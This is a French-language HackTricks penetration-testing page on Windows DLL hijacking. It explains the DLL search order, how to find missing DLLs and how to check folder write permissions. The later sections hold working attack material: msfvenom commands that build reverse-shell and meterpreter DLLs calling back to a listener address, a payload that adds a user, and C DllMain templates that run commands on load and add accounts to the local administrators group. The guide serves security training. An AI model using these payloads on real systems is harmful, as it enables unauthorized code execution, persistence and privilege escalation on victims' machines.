# Dll Hijacking

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Si vous êtes intéressé par une **carrière en piratage** et que vous voulez pirater l'impossible - **nous recrutons !** (_maîtrise du polonais écrit et parlé requise_).

{% embed url="https://www.stmcyber.com/careers" %}

## Définition

Tout d'abord, clarifions la définition. Le détournement de DLL consiste, dans le sens le plus large, à **tromper une application légitime/fiable pour qu'elle charge une DLL arbitraire**. Les termes tels que _DLL Search Order Hijacking_, _DLL Load Order Hijacking_, _DLL Spoofing_, _DLL Injection_ et _DLL Side-Loading_ sont souvent -à tort- utilisés pour dire la même chose.

Le détournement de DLL peut être utilisé pour **exécuter** du code, obtenir **une persistance** et **élever les privilèges**. Parmi ces 3 options, **l'élévation de privilèges** est de loin la moins probable à trouver. Cependant, comme cela fait partie de la section sur l'élévation de privilèges, je me concentrerai sur cette option. Notez également que, indépendamment de l'objectif, un détournement de DLL est effectué de la même manière.

### Types

Il existe une **variété d'approches** parmi lesquelles choisir, le succès dépendant de la façon dont l'application est configurée pour charger ses DLL requises. Les approches possibles comprennent :

1. **Remplacement de DLL** : remplacer une DLL légitime par une DLL malveillante. Cela peut être combiné avec le _DLL Proxying_ \[[2](https://kevinalmansa.github.io/application%20security/DLL-Proxying/)], qui garantit que toutes les fonctionnalités de la DLL d'origine restent intactes.
2. **Détournement de l'ordre de recherche des DLL** : les DLL spécifiées par une application sans chemin sont recherchées dans des emplacements fixes dans un ordre spécifique \[[3](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)]. Le détournement de l'ordre de recherche se produit en plaçant la DLL malveillante dans un emplacement qui est recherché avant la DLL réelle. Cela inclut parfois le répertoire de travail de l'application cible.
3. **Détournement de DLL fantôme** : déposer une DLL malveillante à la place d'une DLL manquante/inexistante que tente de charger une application légitime \[[4](http://www.hexacorn.com/blog/2013/12/08/beyond-good-ol-run-key-part-5/)].
4. **Redirection de DLL** : changer l'emplacement dans lequel la DLL est recherchée, par exemple en modifiant la variable d'environnement `%PATH%`, ou les fichiers `.exe.manifest` / `.exe.local` pour inclure le dossier contenant la DLL malveillante \[[5](https://docs.microsoft.com/en-gb/windows/win32/sbscs/application-manifests), [6](https://docs.microsoft.com/en-gb/windows/win32/dlls/dynamic-link-library-redirection)].
5. **Remplacement de DLL WinSxS** : remplacer la DLL légitime par la DLL malveillante dans le dossier WinSxS correspondant de la DLL ciblée. Souvent appelé DLL side-loading \[[7](https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-dll-sideloading.pdf)].
6. **Détournement de DLL avec chemin relatif** : copier (et éventuellement renommer) l'application légitime dans un dossier accessible en écriture par l'utilisateur, à côté de la DLL malveillante. De cette manière, cela présente des similitudes avec l'exécution de proxy binaire (signé) \[[8](https://attack.mitre.org/techniques/T1218/)]. Une variation de cela est appelée (de manière quelque peu oxymorique) "bring your own LOLbin" \[[9](https://www.microsoft.com/security/blog/2019/09/26/bring-your-own-lolbin-multi-stage-fileless-nodersok-campaign-delivers-rare-node-js-based-malware/)], dans laquelle l'application légitime est apportée avec la DLL malveillante (plutôt que copiée depuis l'emplacement légitime sur la machine de la victime).

## Recherche de DLL manquantes

La façon la plus courante de trouver des DLL manquantes dans un système consiste à exécuter [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) de sysinternals, **en définissant** les **2 filtres suivants** :

![](<../../.gitbook/assets/image (311).png>)

![](<../../.gitbook/assets/image (313).png>)

et affichez simplement l'**activité du système de fichiers** :

![](<../../.gitbook/assets/image (314).png>)

Si vous recherchez des **DLL manquantes en général**, vous **laissez** cela s'exécuter pendant quelques **secondes**.\
Si vous recherchez une **DLL manquante dans un exécutable spécifique**, vous devez définir **un autre filtre comme "Nom du processus" "contient" "\<nom de l'exécutable>", l'exécuter, puis arrêter la capture des événements**.
## Exploitation des DLL manquantes

Pour escalader les privilèges, notre meilleure chance est de pouvoir **écrire une DLL qu'un processus privilégié tentera de charger** dans un endroit où elle sera recherchée. Ainsi, nous pourrons **écrire** une DLL dans un **dossier** où la DLL est recherchée avant le dossier où se trouve la **DLL d'origine** (cas étrange), ou nous pourrons **écrire dans un dossier où la DLL sera recherchée** et où la **DLL d'origine n'existe pas** dans aucun dossier.

### Ordre de recherche des DLL

**Dans la** [**documentation Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching), vous pouvez trouver comment les DLL sont chargées spécifiquement.

En général, une **application Windows** utilisera des **chemins de recherche prédéfinis pour trouver les DLL** et vérifiera ces chemins dans un ordre spécifique. Le détournement de DLL se produit généralement en plaçant une DLL malveillante dans l'un de ces dossiers tout en veillant à ce que cette DLL soit trouvée avant la DLL légitime. Ce problème peut être atténué en demandant à l'application de spécifier des chemins absolus vers les DLL dont elle a besoin.

Vous pouvez voir l'**ordre de recherche des DLL sur les systèmes 32 bits** ci-dessous :

1. Le répertoire à partir duquel l'application a été chargée.
2. Le répertoire système. Utilisez la fonction [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) pour obtenir le chemin de ce répertoire. (_C:\Windows\System32_)
3. Le répertoire système 16 bits. Il n'y a pas de fonction qui obtient le chemin de ce répertoire, mais il est recherché. (_C:\Windows\System_)
4. Le répertoire Windows. Utilisez la fonction [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) pour obtenir le chemin de ce répertoire. (_C:\Windows_)
5. Le répertoire courant.
6. Les répertoires répertoriés dans la variable d'environnement PATH. Notez que cela n'inclut pas le chemin spécifié par la clé de registre **App Paths** spécifique à chaque application. La clé **App Paths** n'est pas utilisée lors du calcul du chemin de recherche des DLL.

C'est l'**ordre de recherche par défaut avec SafeDllSearchMode activé**. Lorsqu'il est désactivé, le répertoire courant passe en deuxième position. Pour désactiver cette fonctionnalité, créez la valeur de registre **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager\\SafeDllSearchMode** et définissez-la sur 0 (par défaut, elle est activée).

Si la fonction [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) est appelée avec **LOAD\_WITH\_ALTERED\_SEARCH\_PATH**, la recherche commence dans le répertoire du module exécutable que **LoadLibraryEx** charge.

Enfin, notez qu'une DLL peut être chargée en indiquant le chemin absolu au lieu du simple nom. Dans ce cas, cette DLL ne sera **recherchée que dans ce chemin** (si la DLL a des dépendances, elles seront recherchées comme si elles étaient chargées par leur nom).

Il existe d'autres façons de modifier l'ordre de recherche, mais je ne vais pas les expliquer ici.

#### Exceptions à l'ordre de recherche des DLL selon la documentation Windows

* Si une **DLL avec le même nom de module est déjà chargée en mémoire**, le système vérifie uniquement la redirection et un manifeste avant de résoudre la DLL chargée, quel que soit le répertoire dans lequel elle se trouve. **Le système ne recherche pas la DLL**.
* Si la DLL est dans la liste des **DLL connues** pour la version de Windows sur laquelle l'application s'exécute, le **système utilise sa copie de la DLL connue** (et les DLL dépendantes de la DLL connue, le cas échéant) **au lieu de rechercher** la DLL. Pour obtenir une liste des DLL connues sur le système actuel, consultez la clé de registre suivante : **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**.
* Si une DLL a des dépendances, le système **recherche** les DLL dépendantes comme si elles étaient chargées avec seulement leurs **noms de module**. Cela est vrai **même si la première DLL a été chargée en spécifiant un chemin complet**.

### Escalade de privilèges

**Prérequis** :

* **Trouver un processus** qui s'exécute/va s'exécuter avec **d'autres privilèges** (mouvement horizontal/lateral) et qui **manque d'une DLL**.
* Avoir **l'autorisation d'écriture** dans n'importe quel **dossier** où la DLL va être **recherchée** (probablement le répertoire de l'exécutable ou un dossier à l'intérieur du chemin système).

Oui, les prérequis sont difficiles à trouver car **par défaut, il est assez étrange de trouver un exécutable privilégié qui manque d'une DLL** et c'est encore **plus étrange d'avoir l'autorisation d'écriture sur un dossier du chemin système** (vous ne pouvez pas par défaut). Mais, dans des environnements mal configurés, cela est possible.\
Dans le cas où vous avez de la chance et que vous vous trouvez dans les conditions requises, vous pouvez consulter le projet [UACME](https://github.com/hfiref0x/UACME). Même si l'**objectif principal du projet est de contourner l'UAC**, vous pouvez y trouver une **preuve de concept** d'un détournement de DLL pour la version de Windows que vous pouvez utiliser (en changeant probablement le chemin du dossier où vous avez l'autorisation d'écriture).

Notez que vous pouvez **vérifier vos autorisations dans un dossier** en utilisant :
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Et **vérifiez les autorisations de tous les dossiers à l'intérieur du PATH** :
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Vous pouvez également vérifier les imports d'un exécutable et les exports d'une dll avec:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Pour un guide complet sur la façon d'**exploiter le détournement de DLL pour escalader les privilèges** avec des autorisations d'écriture dans un **dossier du chemin système**, consultez :

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### Outils automatisés

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) vérifiera si vous avez des autorisations d'écriture sur un dossier à l'intérieur du chemin système.\
D'autres outils automatisés intéressants pour découvrir cette vulnérabilité sont les fonctions de **PowerSploit** : _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ et _Write-HijackDll_.

### Exemple

Si vous trouvez un scénario exploitable, l'une des choses les plus importantes pour l'exploiter avec succès serait de **créer une DLL qui exporte au moins toutes les fonctions que l'exécutable importera**. Quoi qu'il en soit, notez que le détournement de DLL est pratique pour [escalader du niveau d'intégrité moyen à élevé **(contournement de l'UAC)**](../authentication-credentials-uac-and-efs.md#uac) ou de **l'intégrité élevée à SYSTEM**. Vous pouvez trouver un exemple de **comment créer une DLL valide** dans cette étude sur le détournement de DLL axée sur le détournement de DLL pour l'exécution : [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
De plus, dans la **section suivante**, vous pouvez trouver quelques **codes DLL de base** qui pourraient être utiles en tant que **modèles** ou pour créer une **DLL avec des fonctions non requises exportées**.

## **Création et compilation de DLL**

### **Proxification de DLL**

Essentiellement, un **proxy DLL** est une DLL capable d'**exécuter votre code malveillant lorsqu'elle est chargée**, mais aussi de **s'exposer** et de **fonctionner** comme **attendu** en **relayant tous les appels à la bibliothèque réelle**.

Avec l'outil \*\*\*\* [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) \*\*\*\* ou \*\*\*\* [**Spartacus**](https://github.com/Accenture/Spartacus) \*\*\*\*, vous pouvez en fait **indiquer un exécutable et sélectionner la bibliothèque** que vous souhaitez proxifier et **générer une DLL proxifiée** ou **indiquer la DLL** et **générer une DLL proxifiée**.

### **Meterpreter**

**Obtenir un shell inversé (x64) :**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obtenir un meterpreter (x86) :**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Créer un utilisateur (je n'ai pas vu de version x64):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Votre propre

Notez que dans plusieurs cas, la Dll que vous compilez doit **exporter plusieurs fonctions** qui seront chargées par le processus victime, si ces fonctions n'existent pas, le **binaire ne pourra pas les charger** et l'**exploit échouera**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Si vous êtes intéressé par une **carrière de hacking** et souhaitez pirater l'impossible - **nous recrutons !** (_maîtrise du polonais écrit et parlé requise_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
